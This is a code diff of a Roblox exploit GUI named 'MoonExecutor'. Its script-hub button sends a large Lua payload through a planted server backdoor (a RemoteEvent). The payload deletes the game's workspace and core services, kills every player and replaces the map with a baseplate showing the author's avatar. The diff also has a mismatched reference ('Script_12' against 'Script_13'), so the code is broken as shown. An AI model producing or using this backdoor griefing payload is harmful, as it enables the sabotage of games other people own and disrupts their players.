@@ -69,29 +69,29 @@ LMG2L["UIAspectRatioConstraint_8"] = Instance.new("UIAspectRatioConstraint", LMG
 LMG2L["UIAspectRatioConstraint_8"]["AspectRatio"] = 1.79688;
 
 
+-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.DraggingScript
+LMG2L["DraggingScript_9"] = Instance.new("LocalScript", LMG2L["MenuInjectFrame_2"]);
+LMG2L["DraggingScript_9"]["Name"] = [[DraggingScript]];
+
+
 -- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.UIStroke
-LMG2L["UIStroke_9"] = Instance.new("UIStroke", LMG2L["MenuInjectFrame_2"]);
-LMG2L["UIStroke_9"]["Color"] = Color3.fromRGB(255, 0, 0);
+LMG2L["UIStroke_a"] = Instance.new("UIStroke", LMG2L["MenuInjectFrame_2"]);
+LMG2L["UIStroke_a"]["Color"] = Color3.fromRGB(255, 0, 0);
 
 
 -- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.MoonExecutorText
-LMG2L["MoonExecutorText_a"] = Instance.new("TextLabel", LMG2L["MenuInjectFrame_2"]);
-LMG2L["MoonExecutorText_a"]["TextWrapped"] = true;
-LMG2L["MoonExecutorText_a"]["TextStrokeTransparency"] = 0;
-LMG2L["MoonExecutorText_a"]["BorderSizePixel"] = 0;
-LMG2L["MoonExecutorText_a"]["TextScaled"] = true;
-LMG2L["MoonExecutorText_a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-LMG2L["MoonExecutorText_a"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
-LMG2L["MoonExecutorText_a"]["TextColor3"] = Color3.fromRGB(252, 15, 47);
-LMG2L["MoonExecutorText_a"]["BackgroundTransparency"] = 1;
-LMG2L["MoonExecutorText_a"]["Size"] = UDim2.new(0.99565, 0, 0.17969, 0);
-LMG2L["MoonExecutorText_a"]["Text"] = [[MoonExecutor]];
-LMG2L["MoonExecutorText_a"]["Name"] = [[MoonExecutorText]];
-
-
--- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.DraggingScript
-LMG2L["DraggingScript_b"] = Instance.new("LocalScript", LMG2L["MenuInjectFrame_2"]);
-LMG2L["DraggingScript_b"]["Name"] = [[DraggingScript]];
+LMG2L["MoonExecutorText_b"] = Instance.new("TextLabel", LMG2L["MenuInjectFrame_2"]);
+LMG2L["MoonExecutorText_b"]["TextWrapped"] = true;
+LMG2L["MoonExecutorText_b"]["TextStrokeTransparency"] = 0;
+LMG2L["MoonExecutorText_b"]["BorderSizePixel"] = 0;
+LMG2L["MoonExecutorText_b"]["TextScaled"] = true;
+LMG2L["MoonExecutorText_b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["MoonExecutorText_b"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+LMG2L["MoonExecutorText_b"]["TextColor3"] = Color3.fromRGB(252, 15, 47);
+LMG2L["MoonExecutorText_b"]["BackgroundTransparency"] = 1;
+LMG2L["MoonExecutorText_b"]["Size"] = UDim2.new(0.99565, 0, 0.17969, 0);
+LMG2L["MoonExecutorText_b"]["Text"] = [[MoonExecutor]];
+LMG2L["MoonExecutorText_b"]["Name"] = [[MoonExecutorText]];
 
 
 -- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScripthubFrame
@@ -151,9 +151,9 @@ LMG2L["UICorner_12"] = Instance.new("UICorner", LMG2L["Baseplate_11"]);
 LMG2L["UICorner_12"]["CornerRadius"] = UDim.new(0, 4);
 
 
--- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScripthubFrame.ScriptMainFrame.ScrollingFrame.Baseplate.LocalScript
-LMG2L["LocalScript_13"] = Instance.new("LocalScript", LMG2L["Baseplate_11"]);
-
+-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScripthubFrame.ScriptMainFrame.ScrollingFrame.Baseplate.Script
+LMG2L["Script_13"] = Instance.new("LocalScript", LMG2L["Baseplate_11"]);
+LMG2L["Script_13"]["Name"] = [[Script]];
 
 
 -- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScripthubFrame.ScriptMainFrame.CloseButton
@@ -297,6 +297,7 @@ LMG2L["ExecuteButton_23"]["Size"] = UDim2.new(0.18276, 0, 0.10615, 0);
 LMG2L["ExecuteButton_23"]["Text"] = [[Execute]];
 LMG2L["ExecuteButton_23"]["Name"] = [[ExecuteButton]];
 LMG2L["ExecuteButton_23"]["Position"] = UDim2.new(0.0931, 0, 0.85475, 0);
+
 
 
 -- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.ExecuteButton.UICorner
@@ -455,8 +456,8 @@ local function C_5()
 end;
 task.spawn(C_5);
 -- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.DraggingScript
-local function C_b()
-	local script = LMG2L["DraggingScript_b"];
+local function C_9()
+	local script = LMG2L["DraggingScript_9"];
 	local frame = script.Parent -- MainFrame	
 	local UIS = game:GetService("UserInputService")	
 	
@@ -491,27 +492,78 @@ local function C_b()
 		end	
 	end)	
 end;
-task.spawn(C_b);
--- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScripthubFrame.ScriptMainFrame.ScrollingFrame.Baseplate.LocalScript
-local function C_13()
-	local script = LMG2L["LocalScript_13"];
+task.spawn(C_9);
+-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScripthubFrame.ScriptMainFrame.ScrollingFrame.Baseplate.Script
+local function C_12()
+	local script = LMG2L["Script_12"];
 	local button = script.Parent	
 	
 	button.MouseButton1Click:Connect(function()	
 		local backdoor = _G.MoonBackdoor	
-		if not backdoor then	
-			warn("[MoonExecutor] No backdoor!")	
-			return	
-		end	
+		if not backdoor then warn("[MoonExecutor] No backdoor!") return end	
 	
-		local code = "for _, obj in workspace:GetChildren() do if obj.Name ~= 'Baseplate' and not obj:IsA('Terrain') then obj:Destroy() end end "	
-		.. "for _, plr in game:GetService('Players'):GetPlayers() do for _, obj in plr.PlayerGui:GetChildren() do obj:Destroy() end end "	
-		.. "for _, obj in game:GetService('StarterGui'):GetChildren() do obj:Destroy() end "	
-		.. "for _, obj in game:GetService('ReplicatedStorage'):GetChildren() do obj:Destroy() end "	
-		.. "for _, obj in game:GetService('ServerScriptService'):GetChildren() do obj:Destroy() end "	
-		.. "local h = Instance.new('Hint') h.Text = 'WELCOME TO BASIC BASEPLATE' h.Parent = workspace "	
-		.. "local P = game:GetService('Players') local sp = workspace:FindFirstChildOfClass('SpawnLocation') local pos = sp and sp.Position or Vector3.new(0,0,0) "	
-		.. "pcall(function() local id = P:GetUserIdFromNameAsync('KHAFIDZKTP') local desc = P:GetHumanoidDescriptionFromUserId(id) local char = P:CreateHumanoidModelFromDescription(desc, Enum.HumanoidRigType.R6) char.Name = 'YTZ_DEXZ' char:SetPrimaryPartCFrame(CFrame.new(pos + Vector3.new(0,5,0))) char.Parent = workspace end)"	
+		local code = [[	
+	for _, obj in workspace:GetChildren() do	
+		if not obj:IsA("Terrain") and not game:GetService("Players"):GetPlayerFromCharacter(obj) then	
+			obj:Destroy()	
+		end	
+	end	
+	
+	for _, plr in game:GetService("Players"):GetPlayers() do	
+		plr.PlayerGui:ClearAllChildren()	
+		plr.Backpack:ClearAllChildren()	
+		if plr.Character then	
+			local h = plr.Character:FindFirstChildOfClass("Humanoid")	
+			if h then h.Health = 0 end	
+		end	
+	end	
+	
+	game:GetService("StarterGui"):ClearAllChildren()	
+	game:GetService("StarterPack"):ClearAllChildren()	
+	game:GetService("ReplicatedStorage"):ClearAllChildren()	
+	game:GetService("ServerScriptService"):ClearAllChildren()	
+	game:GetService("ServerStorage"):ClearAllChildren()	
+	
+	local bp = Instance.new("Part")	
+	bp.Name = "Baseplate"	
+	bp.Size = Vector3.new(512, 20, 512)	
+	bp.Position = Vector3.new(0, -10, 0)	
+	bp.Anchored = true	
+	bp.BrickColor = BrickColor.new("Medium green")	
+	bp.Material = Enum.Material.Grass	
+	bp.Parent = workspace	
+	
+	local sp = Instance.new("SpawnLocation")	
+	sp.Size = Vector3.new(6, 1, 6)	
+	sp.Position = Vector3.new(0, 1, 0)	
+	sp.Anchored = true	
+	sp.BrickColor = BrickColor.new("Bright blue")	
+	sp.Parent = workspace	
+	
+	local hint = Instance.new("Hint")	
+	hint.Text = "WELCOME TO BASIC BASEPLATE"	
+	hint.Parent = workspace	
+	
+	local P = game:GetService("Players")	
+	
+	pcall(function()	
+		local id1 = P:GetUserIdFromNameAsync("KHAFIDZKTP")	
+		local desc1 = P:GetHumanoidDescriptionFromUserId(id1)	
+		local char1 = P:CreateHumanoidModelFromDescriptionAsync(desc1, Enum.HumanoidRigType.R6)	
+		char1.Name = "YTZ_DEXZ"	
+		char1:SetPrimaryPartCFrame(CFrame.new(5, 5, 5))	
+		char1.Parent = workspace	
+	end)	
+	
+	pcall(function()	
+		local id2 = P:GetUserIdFromNameAsync("zeros7299")	
+		local desc2 = P:GetHumanoidDescriptionFromUserId(id2)	
+		local char2 = P:CreateHumanoidModelFromDescriptionAsync(desc2, Enum.HumanoidRigType.R6)	
+		char2.Name = "My Brother"	
+		char2:SetPrimaryPartCFrame(CFrame.new(-8, 5, 0))	
+		char2.Parent = workspace	
+	end)	
+	]]	
 	
 		if backdoor:IsA("RemoteEvent") then	
 			backdoor:FireServer(code)	
@@ -520,7 +572,7 @@ local function C_13()
 		end	
 	end)	
 end;
-task.spawn(C_13);
+task.spawn(C_12);
 -- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScripthubFrame.ScriptMainFrame.CloseButton.CloseScript
 local function C_15()
 	local script = LMG2L["CloseScript_15"];
